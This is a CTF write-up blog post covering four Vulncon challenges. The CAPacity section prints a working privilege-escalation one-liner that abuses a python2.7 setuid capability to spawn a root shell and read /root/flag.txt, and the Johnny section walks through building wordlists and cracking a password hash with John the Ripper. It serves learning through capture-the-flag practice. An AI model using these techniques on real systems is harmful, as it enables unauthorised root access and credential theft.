---
layout: post
title:  "Vulncon CTF writeups"
date:   2020-12-20 12:59:36 +0200
categories: ctf
---

These are the writeups for the [Vulncon CTF](https://ctf.noobarmy.org/) challenges that I personally solved.

## Maze

[http://maze.noobarmy.org/](http://maze.noobarmy.org/)

Use gobuster to find out subdirectory `/projects`. Navigate there and from the source we find out how to access some images:
```html
 <!--
  <img src="justsomerandomfoldername/image-0.png">
 -->
```
These are QR-codes. Let's dump their contents with a Python script:

```python
import requests
import io
from pyzbar.pyzbar import decode
from PIL import Image

for i in range(28):
    r = requests.get('http://maze.noobarmy.org/projects/justsomerandomfoldername/image-{0}.png'.format(i))
    image=Image.open(io.BytesIO(r.content))
    decoded = decode(image)
    print (decoded[0].data.decode('utf-8')+' ',end='')
```

Output:

```
Hello and welcome to this challenge! We hope that collecting these images 
was not that hard for you, anyways just so you know i love the number 13
```

Let's take a closer look at 13:

![QR Code]({{ site.url }}/assets/txTchqF.png)

```bash
exiftool image-13.png | grep Creator
Creator: aWh5YXBiYXtqQCRfN3UxJF8zaTNhX0BfajNvX3B1QHl5M2F0Mz99
```
Copy the string to [CyberChef](https://gchq.github.io/CyberChef/). add the following recipes: base64 decode and ROT-13.

## CAPacity

As the name suggests this challenge is about abusing Linux capabilities.

```bash
/sbin/getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_setuid+ep

$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1000(shhhhhh) groups=1000(shhhhhh)
# cat /root/flag.txt
vulncon{TW9kZS1TX0hleGNvZGUK}
```
Too bad this challenge was pulled since root access was a threat to the infrastructure.

## Pcaped

```bash
tshark -r Data.pcapng -e data -T fields | tr -d '\n'
```

Copy the string to [CyberChef](https://gchq.github.io/CyberChef/). add the folloiwing recipes from HEX, remove whitespace and from Base64.

## Johnny

Make two wordlists:

```
John
Ripper
Cracker
John37
Ripper37
Cracker37
```

```
!
"
#
%
&
$
@
```

use hashcat-utils to combine into a wordlist:

```bash
/usr/lib/hashcat-utils/combinator.bin 1.txt words > 2.txt    
```

repeat until you have word-symbol-word-symbol-word combination. Run through John The Ripper:

```bash
sudo john hash.txt --wordlist=final.txt 
John37@Cracker@Ripper (Confidential)
```

open up the keepass file and look at the flag:

`Programming_Is_Necessary_For Cyber_Right?`

Fix it by adding the missing `_` and submit.


